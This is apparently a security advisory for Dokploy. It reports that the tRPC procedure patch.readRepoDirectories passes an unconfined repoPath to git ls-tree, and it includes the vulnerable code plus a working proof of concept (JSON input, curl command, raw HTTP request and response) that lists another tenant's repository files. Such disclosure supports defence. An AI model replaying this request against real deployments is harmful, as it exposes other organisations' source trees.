title: Authenticated directory traversal in `patch.readRepoDirectories` lets any member enumerate the file tree of any git repository on the host, including other tenants' source
summary:
### Summary

The `patch.readRepoDirectories` tRPC procedure takes a `repoPath` string straight from the caller and runs `git ls-tree` inside it. The value is never confined to the caller's own patch-repo directory, so a member with read access to one service can point `repoPath` at any path on the host (or a managed server) and list the tracked files of the git repository there - for example another organization's deployed application source under `/etc/dokploy/applications/<other-app>/code`. It is cross-tenant information disclosure of directory and file names.


### Details

From `apps/dokploy/server/api/routers/patch.ts`:

```ts
readRepoDirectories: protectedProcedure
	.input(
		z.object({
			id: z.string().min(1),
			type: z.enum(["application", "compose"]),
			repoPath: z.string(),          // <-- used verbatim as the working directory
		}),
	)
	.query(async ({ input, ctx }) => {
		await checkServicePermissionAndAccess(ctx, input.id, {
			service: ["read"],
		});
		// serverId resolved from the service...
		return await readPatchRepoDirectory(input.repoPath, serverId);
	}),
```

And the sink in `packages/server/src/services/patch-repo.ts`:

```ts
export const readPatchRepoDirectory = async (repoPath: string, serverId?) => {
	const command = `cd ${quote([repoPath])} && git ls-tree -r --name-only HEAD`;
	// exec locally or on the remote server, parse stdout into a tree
};
```

`repoPath` is attacker-controlled and absolute. `quote()` (added for GHSA-56g6, which was a command-injection issue in this same function) blocks shell metacharacters, but the directory itself is still whatever the caller asks for. The authorization check (`service: ["read"]` on `input.id`) only proves the caller can read service `id`; it has no bearing on `repoPath`.

### Proof of concept

Reusing the account, cookie and application from Advisory 1. To make the cross-tenant effect concrete, a second tenant's deployed-application repository is simulated at the real path Dokploy uses, `/etc/dokploy/applications/victim-corp/code`, containing one file named `prod-database-credentials.txt`. The attacker has no relationship to that service.

Readable input:

```json
{"0":{"json":{"id":"4avF15a1L2z-mKxpKQON1","type":"application","repoPath":"/etc/dokploy/applications/victim-corp/code"}}}
```

cURL:

```bash
curl -i -b cookies.txt \
  "http://127.0.0.1:8020/api/trpc/patch.readRepoDirectories?batch=1&input=%7B%220%22%3A%7B%22json%22%3A%7B%22id%22%3A%224avF15a1L2z-mKxpKQON1%22%2C%22type%22%3A%22application%22%2C%22repoPath%22%3A%22/etc/dokploy/applications/victim-corp/code%22%7D%7D%7D"
```

Raw HTTP request:

```http
GET /api/trpc/patch.readRepoDirectories?batch=1&input=%7B%220%22%3A%7B%22json%22%3A%7B%22id%22%3A%224avF15a1L2z-mKxpKQON1%22%2C%22type%22%3A%22application%22%2C%22repoPath%22%3A%22/etc/dokploy/applications/victim-corp/code%22%7D%7D%7D HTTP/1.1
Host: 127.0.0.1:8020
Cookie: better-auth.session_token=YL6XrJByAf9fxICesnHBrHk7K3OEr7s2.TMuqwklJqI3S403Dqpk9fJgF4TeMf3AwR1IUcAKeLpw%3D
Accept: */*
Connection: keep-alive
```

Raw HTTP response:

```http
HTTP/1.1 200 OK
content-type: application/json
Vary: trpc-accept, Accept-Encoding
Date: Sat, 07 Nov 2026 07:49:23 GMT

[{"result":{"data":{"json":[{"name":"prod-database-credentials.txt","path":"prod-database-credentials.txt","type":"file","children":null}],"meta":{"values":{"0.children":["undefined"]},"v":1}}}}]
```

The attacker's service has nothing to do with `victim-corp`, yet the response lists that repository's files. Combined with Advisory 1 the attacker can then read the contents of any file it discovers this way.


### Impact

Cross-tenant and host directory disclosure (CWE-22 / CWE-200). A member can map the source tree of any git repository on the Dokploy host or any managed server - other organizations' application and compose code, and anything else tracked in git under a known or guessed path.
